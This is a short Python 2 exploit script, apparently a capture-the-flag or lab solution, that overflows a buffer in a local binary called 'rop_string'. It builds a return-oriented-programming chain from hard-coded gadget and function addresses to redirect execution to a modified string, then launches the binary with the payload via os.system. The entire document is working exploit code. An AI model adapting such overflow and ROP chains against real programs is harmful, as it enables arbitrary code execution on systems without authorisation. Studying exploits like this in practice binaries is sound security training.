#!/usr/bin/python2

import os
import struct

# We find these values using ROPGadget in GDB via pwndbg.
pop_ret_gadget_one = 0x8049211
pop_ret_gadget_two = 0x8049210
exec_string = 0x80491b6
function_one = 0x80491d7
function_two = 0x8049217

# Bytes used to overflow the buffer.
payload =  "A" * 0x6c
payload += "BBBB"

# Executing a pointer redirection attack.
payload += struct.pack("I", function_one)
payload += struct.pack("I", pop_ret_gadget_one)
payload += struct.pack("I", 0xabadd00d)

payload += struct.pack("I", function_two)
payload += struct.pack("I", pop_ret_gadget_two)
payload += struct.pack("I", 0xdeadbeef)
payload += struct.pack("I", 0xbeefcafe)

# Executing the string we changed.
payload += struct.pack("I", exec_string)

os.system("./rop_string \"%s\"" % payload)